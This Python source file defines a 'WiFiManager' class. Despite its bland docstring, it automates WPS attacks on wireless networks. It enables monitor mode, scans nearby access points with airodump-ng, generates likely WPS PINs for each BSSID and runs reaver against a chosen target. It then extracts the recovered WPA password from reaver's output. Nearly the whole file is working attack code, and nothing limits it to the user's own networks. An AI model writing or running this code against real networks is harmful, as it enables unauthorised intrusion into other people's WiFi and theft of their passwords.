#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi Manager for network operations
"""

import subprocess
import re
import time
import os
import signal
from oneshot import WPSpin
import logging

logger = logging.getLogger(__name__)

class WiFiManager:
    def __init__(self):
        self.monitor_interface = None
        self.original_interface = None
        self.current_process = None
        self.wps_pin_generator = WPSpin()
        
    def get_wireless_interfaces(self):
        """Get list of wireless interfaces"""
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    interface = line.split()[-1]
                    interfaces.append(interface)
            return interfaces
        except Exception as e:
            logger.error(f"Failed to get wireless interfaces: {e}")
            return []
    
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        try:
            interfaces = self.get_wireless_interfaces()
            if not interfaces:
                raise Exception("No wireless interfaces found")
            
            # Use first available interface
            interface = interfaces[0]
            self.original_interface = interface
            
            # Kill interfering processes
            subprocess.run(['airmon-ng', 'check', 'kill'], 
                         capture_output=True, text=True)
            
            # Enable monitor mode
            result = subprocess.run(['airmon-ng', 'start', interface], 
                                  capture_output=True, text=True)
            
            # Find monitor interface name
            monitor_interfaces = self.get_wireless_interfaces()
            for iface in monitor_interfaces:
                if 'mon' in iface or iface != interface:
                    self.monitor_interface = iface
                    break
            
            if not self.monitor_interface:
                # Try alternative method
                self.monitor_interface = f"{interface}mon"
                subprocess.run(['ip', 'link', 'set', interface, 'down'])
                subprocess.run(['iw', interface, 'set', 'monitor', 'none'])
                subprocess.run(['ip', 'link', 'set', interface, 'up'])
                self.monitor_interface = interface
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to enable monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self):
        """Disable monitor mode and restore managed mode"""
        try:
            if not self.monitor_interface:
                return True
            
            # Stop monitor mode
            if 'mon' in self.monitor_interface:
                subprocess.run(['airmon-ng', 'stop', self.monitor_interface], 
                             capture_output=True, text=True)
            else:
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'])
                subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'])
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'])
            
            # Restart network manager
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], 
                         capture_output=True, text=True)
            
            self.monitor_interface = None
            self.original_interface = None
            return True
            
        except Exception as e:
            logger.error(f"Failed to disable monitor mode: {e}")
            return False
    
    def scan_networks(self):
        """Scan for WiFi networks"""
        try:
            if not self.monitor_interface:
                raise Exception("Monitor mode not enabled")
            
            # Use airodump-ng to scan
            with subprocess.Popen(['airodump-ng', '--write-interval', '1', 
                                 '--output-format', 'csv', self.monitor_interface],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True) as proc:
                time.sleep(10)  # Scan for 10 seconds
                proc.terminate()
                proc.wait()
            
            # Parse results from CSV files
            networks = []
            csv_files = [f for f in os.listdir('.') if f.endswith('.csv')]
            
            if csv_files:
                latest_csv = max(csv_files, key=os.path.getctime)
                networks = self._parse_airodump_csv(latest_csv)
                
                # Clean up CSV files
                for f in csv_files:
                    try:
                        os.remove(f)
                    except:
                        pass
            
            return networks
            
        except Exception as e:
            logger.error(f"Failed to scan networks: {e}")
            return []
    
    def _parse_airodump_csv(self, csv_file):
        """Parse airodump-ng CSV output"""
        networks = []
        try:
            with open(csv_file, 'r') as f:
                lines = f.readlines()
            
            # Find the start of AP data
            ap_start = 0
            for i, line in enumerate(lines):
                if 'BSSID' in line and 'First time seen' in line:
                    ap_start = i + 1
                    break
            
            # Parse AP data
            for line in lines[ap_start:]:
                if not line.strip() or 'Station MAC' in line:
                    break
                
                fields = [field.strip() for field in line.split(',')]
                if len(fields) >= 14:
                    bssid = fields[0]
                    power = fields[8]
                    essid = fields[13]
                    channel = fields[3]
                    encryption = fields[5]
                    
                    if bssid and bssid != '':
                        # Generate WPS pins for this BSSID
                        wps_pins = self.wps_pin_generator.getSuggested(bssid)
                        
                        networks.append({
                            'bssid': bssid,
                            'essid': essid if essid else 'Hidden',
                            'channel': channel,
                            'power': power,
                            'encryption': encryption,
                            'wps_pins': wps_pins
                        })
            
        except Exception as e:
            logger.error(f"Failed to parse CSV: {e}")
        
        return networks
    
    def attack_network(self, bssid, essid=None):
        """Attack network using WPS"""
        try:
            if not self.monitor_interface:
                raise Exception("Monitor mode not enabled")
            
            # Generate WPS pins for target
            pins = self.wps_pin_generator.getSuggestedList(bssid)
            if not pins:
                pins = ['12345670', '00000000', '11111111']  # Default pins
            
            # Try each pin
            for pin in pins[:3]:  # Try first 3 pins
                if pin == '':
                    continue
                    
                logger.info(f"Trying PIN {pin} for {bssid}")
                
                # Use reaver for WPS attack
                cmd = ['reaver', '-i', self.monitor_interface, '-b', bssid, 
                       '-p', pin, '-vv', '-L', '-N', '-d', '15', '-T', '1', '-t', '15']
                
                try:
                    self.current_process = subprocess.Popen(cmd, 
                                                          stdout=subprocess.PIPE, 
                                                          stderr=subprocess.PIPE, 
                                                          text=True)
                    
                    # Monitor output for success/failure
                    timeout = 300  # 5 minutes timeout
                    start_time = time.time()
                    
                    while self.current_process.poll() is None:
                        if time.time() - start_time > timeout:
                            self.current_process.terminate()
                            break
                        time.sleep(1)
                    
                    # Check output for results
                    stdout, stderr = self.current_process.communicate()
                    
                    if 'WPS PIN found' in stdout or 'WPA PSK' in stdout:
                        # Extract password from output
                        password_match = re.search(r'WPA PSK.*?\'([^\']+)\'', stdout)
                        password = password_match.group(1) if password_match else 'Found but not extracted'
                        
                        return {
                            'success': True,
                            'message': f'Password found: {password}',
                            'pin': pin,
                            'password': password
                        }
                    
                except Exception as e:
                    logger.error(f"Attack failed with PIN {pin}: {e}")
                    continue
            
            return {
                'success': False,
                'error': 'All PIN attempts failed'
            }
            
        except Exception as e:
            logger.error(f"Attack failed: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    def stop_current_operation(self):
        """Stop current running operation"""
        try:
            if self.current_process:
                self.current_process.terminate()
                self.current_process.wait()
                self.current_process = None
            
            # Kill any remaining processes
            subprocess.run(['pkill', '-f', 'airodump-ng'], capture_output=True)
            subprocess.run(['pkill', '-f', 'reaver'], capture_output=True)
            
        except Exception as e:
            logger.error(f"Failed to stop operation: {e}")
